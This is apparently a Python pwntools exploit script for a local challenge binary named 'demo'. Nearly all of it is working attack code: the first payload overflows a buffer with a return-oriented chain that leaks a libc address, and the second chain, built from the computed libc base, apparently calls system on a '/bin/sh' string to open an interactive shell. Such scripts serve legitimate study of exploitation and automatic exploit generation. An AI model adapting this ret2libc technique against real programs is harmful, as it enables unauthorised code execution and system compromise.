from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/AngErza_challenges/8-demo/demo")
pwn.gdb.attach(p)
payload = b""
payload += b'\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\x16\x04@\x00\x00\x00\x00\x00e\x05@\x00\x00\x00\x00\x00\xf0\x0f`\x00\x00\x00\x00\x000\x04@\x00\x00\x00\x00\x00e\x05@\x00\x00\x00\x00\x00\x80\x18`\x00\x00\x00\x00\x00@\x04@\x00\x00\x00\x00\x00\xc0\x04@\x00\x00\x00\x00\x00x\x18`\x00\x00\x00\x00\x00\xd1\x05@\x00\x00\x00\x00\x00\n'
p.send(payload)
p.recvuntil(b"Let's do it!")
libc_base = u64(p.recv()[0:6].ljust(8,b'\x00')) + -0x21ba0
pwn.log.success('libc_base:' + hex(libc_base))
payload = b""
payload += p64(0x400565) + p64(libc_base + 0x1b3d88) + p64(libc_base + 0x4f420)
payload += b"\n"
p.send(payload)
p.interactive()
